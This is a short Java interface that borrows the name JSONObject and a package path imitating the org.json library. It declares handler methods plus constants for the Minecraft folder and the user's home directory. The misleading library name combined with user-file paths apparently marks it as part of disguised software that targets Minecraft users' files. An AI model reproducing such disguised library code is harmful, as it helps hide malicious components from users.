package org.json.updated.parsers;

import org.json.updated.parsers.util.FileSystemHelper;

public interface JSONObject {
    void handle();
    String getName();
    String sep = FileSystemHelper.getSeparator();
    String mcFolder = FileSystemHelper.getMinecraftFolder();
    String home = System.getProperty("user.home");
}
